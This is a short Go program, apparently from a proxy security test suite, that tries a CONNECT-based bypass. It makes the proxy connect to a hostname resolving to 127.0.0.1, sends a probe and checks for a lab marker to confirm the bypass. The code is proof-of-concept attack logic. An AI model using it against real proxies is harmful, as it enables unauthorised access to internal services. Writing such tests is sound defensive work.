package main

import (
	"io"
	"log"
	"strings"
	"time"

	"oktopus/attack-and-tests/poclib"
)

func cmdRun(args []string) int {
	log.SetFlags(0)
	o, err := parseFlags(args)
	if err != nil {
		return 2
	}
	ok, _ := runAttack(o)
	if ok {
		return 1
	}
	return 0
}

func runAttack(o poclib.RunOpts) (bool, error) {
	log.Printf("=== bypass: CONNECT %s (DNS → 127.0.0.1) ===", connectHost)
	conn, br, code, err := poclib.DialCONNECT(o.ProxyAddr, connectHost, o.ProxyUser, o.ProxyPass)
	if err != nil {
		log.Printf("CONNECT: HTTP %d %v", code, err)
		return false, nil
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(3 * time.Second))
	_, _ = io.WriteString(conn, "PROBE\r\n")
	buf := make([]byte, 256)
	n, _ := br.Read(buf)
	if strings.Contains(string(buf[:n]), labMarker) {
		log.Println("bypass: ПОДТВЕРЖДЕНО")
		return true, nil
	}
	return false, nil
}
